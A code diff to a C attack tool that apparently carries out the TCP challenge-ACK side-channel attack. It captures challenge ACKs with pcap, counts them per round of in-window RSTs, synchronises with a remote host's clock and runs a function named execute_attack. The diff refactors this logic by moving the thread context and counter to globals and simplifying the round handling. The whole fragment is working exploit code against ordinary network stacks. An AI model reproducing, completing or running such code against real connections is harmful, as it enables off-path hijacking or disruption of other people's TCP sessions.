@@ -77,6 +77,10 @@ typedef struct thctx_struct {
 	size_t pktlen;
 } thctx_t;
 
+/* global count for challange ACKs received in one period */
+static int g_chack_cnt = 0;
+/* global context for threads operating on pkts */
+thctx_t g_ctx;
 
 /*
  * if DEVICE is not defined, we'll try to find a suitable device..
@@ -288,13 +292,9 @@ void *send_thread(void *arg)
  * a thread to receive packets =)
  */
 
-static int g_chack_cnt = 0;
-
 void *recv_thread(void *arg)
 {
 	thctx_t *pctx;
-	//int chack_cnt = 0;
-	struct timeval listen_start, now, diff;
 	struct pcap_pkthdr *pchdr = NULL;
 	const u_char *inbuf = NULL;
 	int pcret;
@@ -303,10 +303,7 @@ void *recv_thread(void *arg)
 
 	pctx = (thctx_t *)arg;
 
-	/* listen for acks for 2 seconds */
-	//printf("[*] Waiting 2 seconds for challenge ACKs...\n");
-	//gettimeofday(&listen_start, NULL);
-	//do {
+	/* listen for challenge ACKs and count them */
 	while (1) {
 		pcret = pcap_next_ex(pctx->pch, &pchdr, &inbuf);
 		if (pcret == 1
@@ -319,17 +316,9 @@ void *recv_thread(void *arg)
 			g_chack_cnt++;
 		}
 	}
-#if 0
-		gettimeofday(&now, NULL);
-		timersub(&now, &listen_start, &diff);
-		//printf("%lu %lu\n", diff.tv_sec, diff.tv_usec);
-	} while (diff.tv_sec < 2);
-#endif
-	//} while (diff.tv_sec < 1 || (diff.tv_sec == 1 && diff.tv_usec < 850000));
-	//} while (diff.tv_sec < 2 || (diff.tv_sec == 2 && diff.tv_usec < 50000));
-	//printf("%lu %lu\n", diff.tv_sec, diff.tv_usec);
 
-	return NULL; // (void *)chack_cnt;
+	/* not reached */
+	return NULL;
 }
 
 
@@ -337,7 +326,7 @@ void *recv_thread(void *arg)
  * to conduct the attack, we need to synchronize with the remote system's clock
  *
  * 1. send 200 in-window RSTs spaced evenly
- * 2. count the challenge acks returned
+ * 2. count the challenge ACKs returned
  * 3. adjust accordingly
  * 4. confirm
  *
@@ -406,15 +395,17 @@ int sync_time_with_remote(thctx_t *pctx)
 
 		chack_cnt[round] = g_chack_cnt;
 		g_chack_cnt = 0;
-		printf("[*] Round %d - %d challenge acks\n", round + 1, chack_cnt[round]);
+		printf("[*] Round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);
 
 		/* did we synch?? */
 		if (chack_cnt[round] == 100) {
 			if (round == 2) {
+				/* verify... */
 				round++;
 				continue;
 			}
 			else if (round == 3)
+				/* verified! */
 				break;
 
 			/* we got luck! verify... */
@@ -449,11 +440,9 @@ int sync_time_with_remote(thctx_t *pctx)
 				timersub(&now, &start, &diff);
 			} while ((uint64_t)diff.tv_usec < delay);
 			round++;
-		} else if (round == 2) {
-			 round++;
-		} else if (round == 3) {
+		} else {
 			/* start over :-/ */
-			fprintf(stderr, "[!] reached round 4 without success, restarting...\n");
+			fprintf(stderr, "[!] reached round %d without success, restarting...\n", round + 1);
 			round = 0;
 		}
 	}
@@ -611,14 +600,13 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 
 					/* start the attack now! */
 					if (strncmp(outbuf, "start\n", 6) == 0) {
-						thctx_t ctx;
 
 						/* fill in most of the context */
-						ctx.pch = pch;
-						ctx.ipoff = ipoff;
-						ctx.conn = &legit_conn;
+						g_ctx.pch = pch;
+						g_ctx.ipoff = ipoff;
+						g_ctx.conn = &legit_conn;
 
-						if (!sync_time_with_remote(&ctx))
+						if (!sync_time_with_remote(&g_ctx))
 							fprintf(stderr, "[!] Failed to sync with reomte clock!\n");
 					} else {
 						if (!tcp_send(pch, &legit_conn, TH_PUSH|TH_ACK, outbuf, outlen))
